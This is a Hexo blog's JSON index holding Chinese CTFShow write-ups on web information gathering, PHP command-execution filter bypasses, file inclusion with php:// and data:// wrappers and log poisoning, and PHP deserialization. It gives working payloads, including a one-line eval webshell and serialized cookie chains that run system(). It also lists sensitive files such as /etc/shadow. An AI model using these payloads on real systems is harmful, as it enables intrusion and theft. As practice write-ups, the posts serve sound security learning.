{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2022-09-25T07:31:05.000Z","updated":"2022-09-25T07:31:05.746Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-09-25T07:30:54.000Z","updated":"2022-09-25T07:30:54.491Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-09-25T07:29:56.000Z","updated":"2022-09-25T07:30:40.051Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2022-09-28T18:41:56.338Z","updated":"2022-09-28T18:41:49.684Z","comments":true,"path":"message-board/index.html","permalink":"http://example.com/message-board/index.html","excerpt":"","text":""},{"title":"tages","date":"2022-09-26T13:53:53.000Z","updated":"2022-09-26T13:53:53.638Z","comments":true,"path":"tages/index.html","permalink":"http://example.com/tages/index.html","excerpt":"","text":""}],"posts":[{"title":"CTFShow-JAVA","slug":"JAVA","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:10:44.325Z","comments":true,"path":"/post/JAVA.html","link":"","permalink":"http://example.com/post/JAVA.html","excerpt":"","text":"JAVA","categories":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/categories/CTFShow/"}],"tags":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/tags/CTFShow/"},{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CTFShow-信息收集","slug":"CTFShow","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:05:28.570Z","comments":true,"path":"/post/CTFShow.html","link":"","permalink":"http://example.com/post/CTFShow.html","excerpt":"","text":"信息收集web1开发注释未及时删除 直接查看源码，flag在注释里 web2js前台拦截 === 无效操作 浏览器禁用js或则Burp抓包 web3f12 网络在响应头里就有flag或者直接抓包 web4robots.txt文件泄露 直接查看robots.txt robots.txt （统一小写）是一种存放于网站根目录下的ASCII编码的文本文件。 常见的备份文件 .index.php.swp index.php.swp index.php.bak .index.php~ index.php.bak_Edietplus index.php.~ index.php.1 index.php index.php~ index.php.rar index.php.zip index.php.7z index.php.tar.gz www.zip www.rar www.zip www.7z www.tar.gz www.tar web.zip web.rar web.zip web.7z web.tar.gz web.tar wwwroot.rar web.rar web5phps文件泄露 phps存放着php源码，可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取 php备份文件：后缀为php~或者index.php.bak php的源代码文件：后缀为phps web6源码压缩包泄露 直接访问www.zip，压缩包发现fl000g.txt，url+fl000g.txt访问 web7版本控制泄露源码 git / svn 是由于运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候， .git 这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 访问 url/.git/ ，得到 flag 。 .git文件泄露，当开发人员使用git控制版本时，如果操作不当，可能导致git流入线上环境，导致.git文件夹下的文件被访问，代码泄露，如.git/index文件可找到工程所有文件名和sha1文件,在git/objects下载导致危害 类似的还有 .hg 源码泄露，由于 hg init 的时候生成 .hg 文件。 web8.svn泄露，svn是源代码管理系统，在管理代码的过程中，会生成一个.svn的隐藏文件，导致源码泄露（造成原因是在发布代码时没有使用导入功能，而是直接粘贴复制） 访问 url/.svn/ ，得到 flag 。 Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 web9vim临时文件泄露 如果vim编写时 不是正常退出 就会临时留下一个 后缀名为swp的文件 我们可以查看该文件同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如**.swo**文件。 vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，操作正常，则会删除缓存文件，如果意外退出，缓存文件保留下来，这是时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn 直接访问index.php.swp 一、vim备份文件 默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看； eg:index.php普遍意义上的首页，输入域名不一定会显示。 它的备份文件则为index.php~ 二、vim临时文件 vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件 .submit.swp。如果文件正常退出，则此文件自动删除。 web10cookie泄露，直接 F12 或 burp 抓包看cookie获取flag 。 web11域名txt记录泄露 域名其实也可以隐藏信息，在线DNS域名解析，即可得到flag https://whois.chinaz.com/ http://www.jsons.cn/nslookup/ https://zijian.aliyun.com/ web12敏感信息公布 url/admin/访问后台需要登陆 猜测用户名为admin，密码为页面最下方联系电话号码，登录成功 web13内部技术文档泄露 在页面最下方找到了document，点击进入发现是内部文档，通过后台地址以及用户名和密码登录获取flag web14编辑器配置不当 进入url/editor/ 插入文件-&gt;文件空间 随便点点看看有没有可疑文件，最后发现tmp/html/nothinghere/fl000g.txt 直接访问url+/nothinghere/fl000g.txt进入得到flag web15密码逻辑脆弱 进入url/admin/，需要用户名和密码登录，点击找回密码，需要填写所在地，在页面最下方有一个qq邮箱，通过qq号查询发现在西安，填写密保问题重置密码，登录成功获取flag web16探针泄露 考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag 访问/tz.php 再点击进入phpinfo可以得到flag web17备份SQL文件泄露 backup.sql web18js敏感信息泄露 直接查看js代码，在分数大于100时，windows.confirm(一串uniciode编码)，将其转换为中文，得到110.php，获得flag web19前端密钥泄露 直接查看前端代码，在注释发现用户名和密码，直接登录失败，使用Burp发包，获得flag web20mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database} web21CDN穿透 确定 IP 的话，直接 ping 域名，得到 IP 爆破web21tomcat 认证爆破之custom iterator使用 - 007NBqaq - 博客园 (cnblogs.com) 抓包发现，随便输入的密码被base64编码，解码username:password 对密码进行爆破，猜测用户名为admin: 爆破时要进行base64加密以及关掉默认的url编码 最后密码为shark63，获取flag web22子域名爆破 使用域名挖掘机 web23substr(string,start,length) 打开就是一段代码，手动写一段脚本爆破 &lt;!DOCTYPE html&gt; &lt;html lang='en'&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php for ($i = 0; $i &lt; 1000; $i = $i + 1) { $token = md5($i); if (substr($token, 1, 1) === substr($token, 14, 1) &amp;&amp; substr($token, 14, 1) === substr($token, 17, 1)) { if ((intval(substr($token, 1, 1)) + intval(substr($token, 14, 1)) + substr($token, 17, 1)) / substr($token, 1, 1) === intval(substr($token, 31, 1))) { echo $i; } } } ?&gt; &lt;/body&gt; &lt;/html&gt; web24mt_srand伪随机数 mt_srand函数只要规定了种子，其得到的伪随机数就是确定的，因此，我们自行构造一个和其种子一样的代码 mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的 &lt;?php mt_srand(372619038); echo intval(mt_rand()); ?&gt; web25mtrand()随机数生成漏洞 include(\"flag.php\"); if(isset($_GET['r'])){ $r = $_GET['r']; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand());//当r取0的时候就可以得到mt_rand()的值 if((!$rand)){ if($_COOKIE['token']==(mt_rand()+mt_rand())){ echo $flag; } }else{ echo $rand; } }else{ highlight_file(__FILE__); echo system('cat /proc/version'); } 使用php_mt_seed - MT_RAND（）种子饼干 (openwall.com)爆破出种子 最后可以得到，这三个mt_rand()的值都不一样 &lt;?php mt_srand(2414568491); echo mt_rand().\"\\n\"; echo mt_rand()+mt_rand(); ?&gt; 然后通过burp发包获取flag web26抓包后直接发包得到flag web27爆破生日日期 可以获取录取名单，得到姓名和缺少出生日期的身份证号码 在查询页面发包 抓取后进行爆破 最后得到正确的日期 登录获取flag web28提示爆破目录 通过暴力破解目录/0-100/0-100/看返回数据包 爆破的时候去掉2.txt 仅仅爆破目录即可 命令执行web29preg_match 执行一个正则表达式匹配 &lt;?php //模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索 if (preg_match(\"/php/i\", \"PHP is the web scripting language of choice.\")) { echo \"查找到匹配的字符串 php。\"; } else { echo \"未发现匹配的字符串 php。\"; } ?&gt; error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 首先执行ls命令，利用system ?c=system(ls); 得到两个文件 flag.php和index.php 用cat命令读取flag.php，因为过滤了flag所以使用通配符 ?c=system('cat fla*.php'); ?c=system(\"nl fla?????\"); ?c=echo `nl fl''ag.php`;或者c=echo `nl fl“”ag.php`; ?c=echo `nl fl\\ag.php`;//转义字符绕过 ?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php ?c=eval($_GET[1]);&amp;1=system('nl flag.php'); ?c=awk '{printf $0}' flag.php|| ?c=$a=\"fla\";$b=\"g.php\";echo%20file_get_contents($a.$b); linux文件内容查看命令 cat、tac、nl、more、less、head、tail、`` 通配符 *可以通配多个字符 ?可以通配一个字符 web30过滤了flag、system、php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 可以使用其他函数 system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 同shell_exec() c=echo exec('nl fla?????'); c=echo `nl fla''g.p''hp`; c=echo `nl fla?????`; web31error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=eval($_GET[1]);&amp;1=system('nl flag.php');//只过滤了c，1可以继续使用空格 c=highlight_file(next(array_reverse(scandir(dirname(__FILE__))))); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=echo(`nl%09fl[abc]*`);//%09就是tab,[abc]也是正则的一种 c=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"nl%09fl[a]*\");等价于system() c=echo`strings%09f*`; c=echo`strings\\$IFS\\$9f*`必须加转义字符 show_source(next(array_reverse(scandir(pos(localeconv()))))); scandir('.')这个函数的作用是扫描当前目录 localeconv()函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. pos()/current()函数返回数组第一个值 array_reverse()是将数组颠倒 next()将数组指针一项下一位 show_source()的意思是读取函数内容 web32if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=$nice=include$_GET[\"url\"]?&gt;&amp;url=php://filter/read=convert.base64- encode/resource=flag.php //include可以不用括号，后面直接跟变量不用空格，分号可以用?&gt;代替 //利用filter协议读文件，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。 data伪协议 把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本 c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web33if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64- encode/resource=flag.php c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; web34if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } web35同上 web36if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\&lt;|\\=|\\/|[0-9]/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; web37if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== //&lt;?php system('cat flag.php');?&gt; /?c=data://text/plain,&lt;?php system('cat fla*');?&gt; 还可以配合UA头执行日志包含 c=/var/log/nginx/access.log web38if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|php|file/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== 也可以日志包含 c=/var/log/nginx/access.log web39data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用 if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c.\".php\"); } }else{ highlight_file(__FILE__); } /?c=data://text/plain,&lt;?php system('cat fla*');?&gt; ??为什么base64不行 web40if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } web41web42web43web44web45web46web47web48web49web50web51web52web53web54web55web56web57web58web59web60","categories":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/categories/CTFShow/"}],"tags":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/tags/CTFShow/"},{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"PHP TIPS","slug":"PHP TIPS","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:09:12.373Z","comments":true,"path":"/post/PHP TIPS.html","link":"","permalink":"http://example.com/post/PHP%20TIPS.html","excerpt":"","text":"PHP TIPS _就是全局变量 eval与system eval可以等价于&lt;? eval(\"asdasdasd;\"); &lt;?php asdasdasd; eval(\"?&gt;\" + \"system(ls);\"); &lt;?php ?&gt;system(ls);","categories":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"文件包含","slug":"PHP伪协议","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:10:13.583Z","comments":true,"path":"/post/PHP伪协议.html","link":"","permalink":"http://example.com/post/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html","excerpt":"","text":"文件包含PHP包含函数： include()：如果包含文件未找到会显示警告，脚本继续执行； include_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行； require()：包含文件未找到会产生致命错误，脚本终止； require_once()：包含过的文件不再包含，包含文件未找到会产生致命错误，脚本终止。 敏感文件 敏感文件 Linux/Unix系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 PHP伪协议php - PHP伪协议总结_个人文章 - SegmentFault 思否 file://条件 allow_url_fopen:off/on allow_url_include :off/on 作用 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明 file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。 用法 /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\\path\\to\\winfile.ext \\\\smbserver\\share\\path\\to\\winfile.ext file:///path/to/file.ext ex file://[文件的绝对路径和文件名] http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt [文件的相对路径和文件名] http://127.0.0.1/include.php?file=./phpinfo.txt [http：//网络路径和文件名] http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt php:// 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 说明：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://filter该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下： 可用的过滤器列表 ex php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码） http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php php://input + [POST DATA]执行php代码 http://127.0.0.1/include.php?file=php://input [POST DATA部分] &lt;?php phpinfo(); ?&gt; 若有写入权限，写入一句话木马 http://127.0.0.1/include.php?file=php://input [POST DATA部分] &lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt; CTFShowweb78if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 无过滤，直接include ?file=php://filter/convert.base64-encode/resource=flag.php bp抓包，给file传参?file=php://input然后在post输出想要执行的代码 web79if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 相对于上一题，$file中的php转换了？？？即过滤了php，所以php协议不能用了 str_replace区分大小写 str_ireplace不区分 所以可以使用大小写绕过 data协议 php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码 payload：?file=data://text/plain,&lt;?= system('tac flag.???');?&gt; 逗号后面是要执行的php代码 或者 payload：?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4= 逗号后面是要执行的php代码的base64加密形式 注：data://可以用data:代替 web80过滤了php和data if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } 使用大小写绕过，先ls查看文件名再查看flag 日志文件包含 日志文件包含伪造UA写入php代码 日志文件记录了服务器收到的每一次请求的 IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。 访问日志的位置和文件名在不同的系统上会有所差异 apache一般是/var/log/apache/access.log apache2一般是/var/log/apache2/access.log nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log 这个Linux的nginx日志文件路径是/var/log/nginx/access.log，要在用文件包含漏洞读取日志文件的同时，修改ua头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码 且操作一定不能出问题，如果报错就要销毁容器从头再来 因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。 ?file=/var/log/nginx/access.log&amp;1=ls HTTP/1.1 ?file=/var/log/nginx/access.log&amp;1=cat%20fl0g.php web81因为过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含 if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(\"php\", \"???\", $file); $file = str_replace(\"data\", \"???\", $file); $file = str_replace(\":\", \"???\", $file); include($file); }else{ highlight_file(__FILE__); } web82","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"CTFShow-反序列化","slug":"PHP反序列化","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:09:48.494Z","comments":true,"path":"/post/PHP反序列化.html","link":"","permalink":"http://example.com/post/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html","excerpt":"","text":"PHP反序列化web254include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ $user = new ctfShowUser(); if($user-&gt;login($username,$password)){ if($user-&gt;checkVip()){ $user-&gt;vipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } ?username=xxxxxx&amp;password=xxxxxx web255include('flag.php'); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; echo \"your flag is \".$flag; }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ $user = unserialize($_COOKIE['user']); if($user-&gt;login($username,$password)){ if($user-&gt;checkVip()){ $user-&gt;vipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } GET ?username=xxxxxx&amp;password=xxxxxx $user = unserialize($_COOKIE['user']); $user-&gt;vipOneKeyGetFlag(); if($this-&gt;isVip){ global $flag; echo \"your flag is \".$flag; } 需要使$this-&gt;isVip的值为True，需要构造链子 &lt;?php class ctfShowUser{ public $isVip; public function __construct(){ $this-&gt;isVip = true; } } class ctfShowUser{ public $isVip=true; } $a = new ctfShowUser(); echo urlencode(serialize($a)); ?&gt; 由于cookie中将\"作为截断符号，所需要编码绕过，这里采用url编码 O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D web256class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public function checkVip(){ return $this-&gt;isVip; } public function login($u,$p){ return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; } public function vipOneKeyGetFlag(){ if($this-&gt;isVip){ global $flag; if($this-&gt;username!==$this-&gt;password){ echo \"your flag is \".$flag; } }else{ echo \"no vip, no flag\"; } } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ $user = unserialize($_COOKIE['user']); if($user-&gt;login($username,$password)){ if($user-&gt;checkVip()){ $user-&gt;vipOneKeyGetFlag(); } }else{ echo \"no vip,no flag\"; } } GET ?username=1&amp;password=2 &lt;?php class ctfShowUser{ public $username='1'; public $password='2'; public $isVip=true; } $a = new ctfShowUser(); echo urlencode(serialize($a)); ?&gt; O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D get传入的username和password要等于反序列化对象的username和passwd web257class ctfShowUser{ private $username='xxxxxx'; private $password='xxxxxx'; private $isVip=false; private $class = 'info'; public function __construct(){ $this-&gt;class=new info(); } public function login($u,$p){ return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; } public function __destruct(){ $this-&gt;class-&gt;getInfo(); } } class info{ private $user='xxxxxx'; public function getInfo(){ return $this-&gt;user; } } class backDoor{ private $code; public function getInfo(){ eval($this-&gt;code); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ $user = unserialize($_COOKIE['user']); $user-&gt;login($username,$password); } &lt;?php class ctfShowUser{ private $class = 'backDoor'; public function __construct(){ $this-&gt;class=new backDoor(); } } class backDoor{ private $code = 'system(\"cat flag.php\");'; } $a = new ctfShowUser(); echo urlencode(serialize($a)); ?&gt; Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D GET ?username=1&amp;password=1 web258class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'info'; public function __construct(){ $this-&gt;class=new info(); } public function login($u,$p){ return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; } public function __destruct(){ $this-&gt;class-&gt;getInfo(); } } class info{ public $user='xxxxxx'; public function getInfo(){ return $this-&gt;user; } } class backDoor{ public $code; public function getInfo(){ eval($this-&gt;code); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])){ $user = unserialize($_COOKIE['user']); } $user-&gt;login($username,$password); } preg_match('/[oc]:\\d+:/i', $_COOKIE['user']) 正则过滤[oc]是匹配o字符或者c字符，\\d匹配一个数字字符，等价于[0-9]，+: 匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 \"zo\" 以及 \"zoo\"，但不能匹配 \"z\"。+ 等价于 {1,}。/i: 表示匹配的时候不区分大小写 \"o:\"后不能跟数字，可以加个+号绕过 O:11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}} 修改为改后： O:+11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:0;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:17:\"system('tac f*');\";}}再url编码 O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system('tac%20f*')%3B%22%3B%7D%7D error_reporting(0); highlight_file(__FILE__); class ctfShowUser{ public $username='xxxxxx'; public $password='xxxxxx'; public $isVip=false; public $class = 'info'; public function __construct(){ $this-&gt;class=new info(); } public function login($u,$p){ return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; } public function __destruct(){ $this-&gt;class-&gt;getInfo(); } } class info{ public $user='xxxxxx'; public function getInfo(){ return $this-&gt;user; } } class backDoor{ public $code; public function getInfo(){ eval($this-&gt;code); } } $username=$_GET['username']; $password=$_GET['password']; if(isset($username) &amp;&amp; isset($password)){ 